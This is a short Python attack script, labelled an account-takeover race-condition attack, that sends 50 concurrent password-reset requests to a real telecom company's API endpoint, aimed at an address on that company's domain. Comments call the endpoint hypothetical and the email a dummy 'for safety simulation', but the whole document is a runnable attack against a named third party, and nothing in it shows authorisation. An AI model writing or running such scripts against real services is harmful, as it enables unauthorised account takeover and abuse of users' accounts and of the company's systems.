import requests
import concurrent.futures

def ato_race_condition(email):
    url = "https://www.telkomsel.com/api/user/password_reset" # Hypothetical endpoint from Angular recon
    headers = {"Content-Type": "application/json"}
    payload = {"email": email}
    
    print(f"[*] Launching Race Condition Attack on {email}...")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(requests.post, url, json=payload, headers=headers) for _ in range(50)]
        
        for future in concurrent.futures.as_completed(futures):
            if future.result().status_code == 200:
                print(f"[!] SUCCESS: Request accepted! (Status: {future.result().status_code})")
                return True
    return False

if __name__ == "__main__":
    # Use a dummy email for safety simulation
    ato_race_condition("admin_test@telkomsel.com")
